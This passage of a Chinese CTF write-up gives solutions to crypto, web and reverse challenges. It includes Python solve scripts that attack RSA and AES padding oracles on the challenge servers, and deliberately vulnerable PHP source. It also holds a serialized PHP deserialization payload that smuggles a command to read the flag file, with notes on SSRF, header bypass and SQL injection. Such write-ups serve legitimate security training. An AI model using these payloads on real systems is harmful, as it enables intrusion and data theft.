src="https://upload-images.jianshu.io/upload_images/9223743-3e19ce4d795f6163.png" alt="image.png"></p><p>只要满足 <code>pow(c,D,N) == m</code> 即可，所以我们可以自己选定一个 d,然后令 <code>n=pow(c,d)-m</code> 即可。</p><p>第二个点是下面这段代码：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f6d2cc159b224ad6.png" alt="image.png"></p><p>这里给了我们一次解密的机会，但不允许解密明文，这个考点在之前的 suctf 出过，思路是让服务器解密<code>(c*pow(2,e,n))%n</code> ，这样得到的明文是 <code>2*m</code>，除2即可。</p><p>脚本如下：（拿 socket 写的，比较丑）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">HOST=<span class="string">'106.75.101.197'</span></span><br><span class="line">PORT=<span class="number">7544</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((HOST, PORT))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force</span><span class="params">(pad, shavalue)</span>:</span></span><br><span class="line">    dict = string.letters + string.digits</span><br><span class="line">    key = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i1 <span class="keyword">in</span> dict:</span><br><span class="line">        tmp = key</span><br><span class="line">        key1 = tmp + i1</span><br><span class="line">        <span class="keyword">for</span> i2 <span class="keyword">in</span> dict:</span><br><span class="line">            tmp = key1</span><br><span class="line">            key2 = tmp + i2</span><br><span class="line">            <span class="keyword">for</span> i3 <span class="keyword">in</span> dict:</span><br><span class="line">                tmp = key2</span><br><span class="line">                key3 = tmp + i3</span><br><span class="line">                <span class="keyword">for</span> i4 <span class="keyword">in</span> dict:</span><br><span class="line">                    tmp = key3</span><br><span class="line">                    key4 = tmp + i4</span><br><span class="line">                    final_key = key4</span><br><span class="line">                    <span class="keyword">if</span> sha512(pad+key4).hexdigest()==shavalue:</span><br><span class="line">                        <span class="keyword">print</span> key4</span><br><span class="line">                        <span class="keyword">return</span> key4</span><br><span class="line">content = sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line"><span class="keyword">print</span> content</span><br><span class="line">pad=content[<span class="number">20</span>+<span class="number">7</span>:<span class="number">20</span>+<span class="number">7</span>+<span class="number">16</span>]</span><br><span class="line">hash=content[<span class="number">20</span>+<span class="number">33</span>:]</span><br><span class="line"><span class="keyword">print</span> pad</span><br><span class="line"><span class="keyword">print</span> hash</span><br><span class="line">sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">sock.send(str(brute_force(pad,hash))+<span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">content=sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line"><span class="keyword">print</span> content</span><br><span class="line">m=int(re.findall(<span class="string">":(.+?)\nand"</span>,content)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">c=int(re.findall(<span class="string">"ciphertext:0x(.+)"</span>,content)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">d=<span class="number">97</span></span><br><span class="line">n=pow(c,d)-m</span><br><span class="line"><span class="keyword">print</span> n</span><br><span class="line"><span class="keyword">print</span> sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">sock.send(str(n)+<span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">sock.send(str(d)+<span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">msg1 = hex(m)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">content=sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line"><span class="keyword">print</span> content</span><br><span class="line">n=int(re.findall(<span class="string">"n=(.+?)\n"</span>,content)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">e=int(re.findall(<span class="string">"e=(.+?)\n"</span>,content)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">c=re.findall(<span class="string">"c=(.+)"</span>,content)[<span class="number">0</span>]</span><br><span class="line">c=c+sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">c=int(c,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line"><span class="keyword">print</span> sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">sock.send(str((c*pow(<span class="number">2</span>,e,n))%n)+<span class="string">"\n"</span>)</span><br><span class="line">content=sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line"><span class="keyword">print</span> content</span><br><span class="line">m=int(re.findall(<span class="string">"message:0x(.+)"</span>,content)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">msg2 = hex(m/<span class="number">2</span>)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">sock.send(str(m/<span class="number">2</span>)+<span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">content=sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">flag=re.findall(<span class="string">"flag:0x(.+)"</span>,content)[<span class="number">0</span>]</span><br><span class="line">flag=flag.decode(<span class="string">"hex"</span>)</span><br><span class="line">cipher = AES.new(msg2, AES.MODE_CBC, msg1)</span><br><span class="line"><span class="keyword">print</span> cipher.decrypt(flag)</span><br></pre></td></tr></table></figure><p>这个题我用 socket 遇到了一个坑点，就是在收到服务器发来的 n,e,c 时，接受到 c 后服务器又发来了一个大约 29 长度的 16 进制数，我开始不知道是什么，结果脚本死活过不了，发过去的结果不对。</p><p>卡了好久，之后发现 c 的位数好像有点少，才明白那个 16 进制原来是 c 的后面一部分… 不知为何给我发过来的时候分了两步发送，所以才有我的这段代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=re.findall(<span class="string">"c=(.+)"</span>,content)[<span class="number">0</span>]</span><br><span class="line">c=c+sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">c=int(c,<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>最后：</p><blockquote><p>flag{ec35162f-94b3-47e4-8d2c-6da6bba0391f}</p></blockquote><h4 id="aessss"><a href="#aessss" class="headerlink" title="aessss"></a>aessss</h4><p>这个题目问题出在 padding 的时候，由于不足 256 位要进行 padding，padding 的字节也就是缺的字节数，但是如果明文够 256 字节，那么按照代码写的就不进行padding：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(self, s)</span>:</span></span><br><span class="line">    s += (<span class="number">256</span> - len(s)) * chr(<span class="number">256</span> - len(s))</span><br><span class="line">    ret = [<span class="string">'\x00'</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">    <span class="keyword">for</span> index, pos <span class="keyword">in</span> enumerate(self.s_box):</span><br><span class="line">        ret[pos] = s[index]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(ret)</span><br></pre></td></tr></table></figure><p>最大的问题出在 unpad 上，unpad 没有进行检查，仅仅通过最后一个字节来判断填充的字节数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span><span class="params">(self, s)</span>:</span></span><br><span class="line">       ret = [<span class="string">'\x00'</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">       <span class="keyword">for</span> index, pos <span class="keyword">in</span> enumerate(self.invs_box):</span><br><span class="line">           ret[pos] = s[index]</span><br><span class="line">       <span class="keyword">return</span> <span class="string">''</span>.join(ret[<span class="number">0</span>:-ord(ret[<span class="number">-1</span>])])</span><br></pre></td></tr></table></figure><p>而且服务器提供了加密当前的 flag 以及对当前的 flag 后面追加信息的功能，我们的利用思路如下：</p><ol><li>选择 choice2，追加 <code>256-33 =223</code>字节，使当前 flag 不需要填充，追加的最后一个字节设置成<code>chr(256-32=224)</code></li><li>服务器对 flag 追加我们的信息，并进行 s 盒替换，结果赋给类中的 flag 变量。</li><li>我们再次选择 choice2，这里由于我们需要追加，服务器会将类中的 flag 变量取出进行逆 S 盒替换和 unpad，这样按照这个 unpad 算法会把后面 224 字节的全部当成 padding去掉，明文剩下了真正 flag 的前32位</li><li>我们此时输入一个字符 i,那么此时加密的对象就是<code>flag[:32]+i</code> </li><li>选择 choice1 对当前 flag 加密，控制 i 进行爆破，如果得到的密文和最初的 flag 加密的密文一样，就得到了 flag 的最后一个字节</li><li>逐字节爆破，直至获取全部的 flag。</li></ol><p>解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">HOST=<span class="string">'106.75.13.64'</span></span><br><span class="line">PORT=<span class="number">54321</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((HOST, PORT))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force</span><span class="params">(pad, shavalue)</span>:</span></span><br><span class="line">    dict = string.letters + string.digits</span><br><span class="line">    key = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i1 <span class="keyword">in</span> dict:</span><br><span class="line">        tmp = key</span><br><span class="line">        key1 = tmp + i1</span><br><span class="line">        <span class="keyword">for</span> i2 <span class="keyword">in</span> dict:</span><br><span class="line">            tmp = key1</span><br><span class="line">            key2 = tmp + i2</span><br><span class="line">            <span class="keyword">for</span> i3 <span class="keyword">in</span> dict:</span><br><span class="line">                tmp = key2</span><br><span class="line">                key3 = tmp + i3</span><br><span class="line">                <span class="keyword">for</span> i4 <span class="keyword">in</span> dict:</span><br><span class="line">                    tmp = key3</span><br><span class="line">                    key4 = tmp + i4</span><br><span class="line">                    final_key = key4</span><br><span class="line">                    <span class="keyword">if</span> sha256(key4+pad).hexdigest()==shavalue:</span><br><span class="line">                        <span class="keyword">print</span> key4</span><br><span class="line">                        <span class="keyword">return</span> key4</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice1</span><span class="params">()</span>:</span></span><br><span class="line">    sock.send(<span class="string">"1\n"</span>)</span><br><span class="line">    result=sock.recv(<span class="number">1024</span>).strip()[<span class="number">30</span>:]</span><br><span class="line">    sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice2</span><span class="params">(pad)</span>:</span></span><br><span class="line">    sock.send(<span class="string">"2\n"</span>)</span><br><span class="line">    sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    sock.send(pad+<span class="string">"\n"</span>)</span><br><span class="line">    sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice3</span><span class="params">(str)</span>:</span></span><br><span class="line">    sock.send(<span class="string">"3\n"</span>)</span><br><span class="line">    sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    sock.send(str+<span class="string">"\n"</span>)</span><br><span class="line">    result=sock.recv(<span class="number">1024</span>).strip()[<span class="number">33</span>:]</span><br><span class="line">    sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">content = sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">pad=content[<span class="number">12</span>:<span class="number">12</span>+<span class="number">16</span>]</span><br><span class="line">hash=content[<span class="number">33</span>:<span class="number">33</span>+<span class="number">64</span>]</span><br><span class="line">sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">sock.send(str(brute_force(pad,hash))+<span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> sock.recv(<span class="number">1024</span>).strip()</span><br><span class="line">flag_enc=choice1()</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>):</span><br><span class="line">    a = <span class="string">''</span>.join([<span class="string">'a'</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">223</span>)])</span><br><span class="line">    a = a[:<span class="number">-1</span>] + chr(<span class="number">224</span>+i)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">print</span> c+flag</span><br><span class="line">        choice2(a)</span><br><span class="line">        choice2(c+flag)</span><br><span class="line">        <span class="keyword">if</span> choice1() == flag_enc:</span><br><span class="line">            flag=c+flag</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"success:"</span>,flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>爆破到最后一个字节崩了。。。 应该是去掉了所有的 flag ，不过可以猜出来 flag</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-3546631e2168bd65.png" alt="image.png"></p><blockquote><p>flag{H4ve_fun_w1th_p4d_and_unp4d}</p></blockquote><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="what-are-you-doing"><a href="#what-are-you-doing" class="headerlink" title="what are you doing?"></a>what are you doing?</h4><p>提示看 robots.txt，发现了 source.php 和 flag.php。</p><p>访闻 source.php ，提示管理员登录，改包利用 x-client-ip 进行绕过，提示要 post admin 和 url 参数。</p><p>url 放进去网址后，得到一个路径，访问应该是源码。</p><p>猜想是 SSRF ，利用 file 协议读取 flag:</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-6d5858fcd7b731e6.png" alt="QQ图片20181104173319.png"></p><p>访问得到 flag。</p><h4 id="Can-you-hack-me"><a href="#Can-you-hack-me" class="headerlink" title="Can you hack me?"></a>Can you hack me?</h4><p>存在源码泄露，index.php.swp,用 vim 还原：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">        $str=preg_replace(<span class="string">"/[&lt;&gt;*;|?\n ]/"</span>,<span class="string">""</span>,$str);</span><br><span class="line">        $str=str_replace(<span class="string">'flag'</span>,<span class="string">''</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;           </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo</span><span class="params">($host)</span></span>&#123;</span><br><span class="line">        system(<span class="string">"echo $host"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"echo"</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$first=<span class="string">'hi'</span>;</span><br><span class="line">$var=<span class="string">'var'</span>;</span><br><span class="line">$bbb=<span class="string">'bbb'</span>;</span><br><span class="line">$ccc=<span class="string">'ccc'</span>;</span><br><span class="line">$i=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">if</span>($i===<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $i++;</span><br><span class="line">            $$key = $value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($first===<span class="string">"doller"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    @parse_str($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="keyword">if</span>($var===<span class="string">'give'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($bbb===<span class="string">'me'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>($ccc===<span class="string">'flag'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;welcome&lt;/br&gt;"</span>;</span><br><span class="line">            $come=@$_POST[<span class="string">'come'</span>];</span><br><span class="line">            unserialize($come);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;think about it&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"no"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"can you hack me?"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>明显的反序列化，回调函数调用 echo 函数的 system，存在 waf，flag过滤用双写绕过，反引号没有过滤</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">come=O:4:&quot;come&quot;:2:&#123;s:12:&quot;%00come%00method&quot;;s:4:&quot;echo&quot;;s:10:&quot;%00come%00args&quot;;a:1:&#123;s:4:&quot;host&quot;;s:30:&quot;`nl$&#123;IFS&#125;../../../../flaflagg`&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="GOOD-JOB"><a href="#GOOD-JOB" class="headerlink" title="GOOD JOB"></a>GOOD JOB</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//error_reporting(0);</span></span><br><span class="line">    <span class="comment">//$dir=md5("icq" . $_SERVER['REMOTE_ADDR']);</span></span><br><span class="line">    $dir=md5(<span class="string">"icq"</span>);</span><br><span class="line">    $sandbox = <span class="string">'/var/sandbox/'</span> . $dir;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>])&#123;</span><br><span class="line">        $filename = !<span class="keyword">empty</span>($_POST[<span class="string">'file'</span>]) ? $_POST[<span class="string">'file'</span>] : $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($filename)) &#123;</span><br><span class="line">            $filename = explode(<span class="string">'.'</span>, $filename);</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = end($filename);</span><br><span class="line">        <span class="keyword">if</span>($ext==$filename[count($filename) - <span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"emmmm..."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $new_name = (string)rand(<span class="number">100</span>,<span class="number">999</span>).<span class="string">"."</span>.$ext;</span><br><span class="line">        move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$new_name);</span><br><span class="line">        $_ = $_POST[<span class="string">'hehe'</span>];</span><br><span class="line">        <span class="keyword">if</span>(@substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>)===<span class="string">'@&lt;?php'</span> &amp;&amp; strpos($_,$new_name)===<span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>($_);</span><br><span class="line">        &#125;</span><br><span class="line">        unlink($new_name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>代码审计，看到最里面的 include 还以为是今年 HITCON 的 one-line-challenge 升级版，结果卡在了第一步…</p><p>第一步是网鼎杯的上传题，学习了一波用数组绕过。</p><p>之后文件名包含随机数，直接爆破。有个 unlike 使用 <code>/.</code> 绕过。</p><p>主办方直接把平台关了… 太狠了，还想着复现一波，只能看看各位大师傅的 wp 了。</p><h4 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h4><p>首先是 sql 注入，首先经典<code>&#39; or 1# 和</code> <code>&#39;or 0#</code> ，然后拿 sqlmap 跑一波 ，level5 没有什么卵用。</p><p>把盲注的 payload 贴到 sqlmap 的 url 里，sqlmap 一把梭，直接注出来管理员密码：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f7d77303ea1135aa.png" alt="QQ图片20181105115110.png"></p><p> 解密，密码是<code>adminpassword</code>，进去发现是个文件上传，一直显示<code>uploaded to ./***.txt please upload to ./flag.php</code>  访问文件发现也没有，一直想 getshell 卡在这里。</p><p>赛后看师傅题解发现自己思路太僵硬了… 这个题只需要上传到 flag.php 就得到 flag，思路就是抓包发现文件名拼接，绕过过滤的 <strong>php</strong>，然后有个<code>%02</code> 的截断（从来没听说过….），自己太菜了。</p><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><p>两个关键函数第一个 sub_40111A简单的异或与移位，所以逆算法就是将数组先按位异或，然后数组左移六位|数组右移两位。第二个Sub_401332复习了下离散数学，经过各种逻辑运算后其实最后还是等效为异或，相邻数异或然后一共四轮。</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">flag1=<span class="string">''</span></span><br><span class="line">num1=[<span class="number">0x99</span>, <span class="number">0xB0</span>, <span class="number">0x87</span>, <span class="number">0x9E</span>, <span class="number">0x70</span>, <span class="number">0xE8</span>,</span><br><span class="line">      <span class="number">0x41</span>, <span class="number">0x44</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x8B</span>, <span class="number">0x9A</span>,</span><br><span class="line">      <span class="number">0x74</span>, <span class="number">0xBC</span>, <span class="number">0x55</span>, 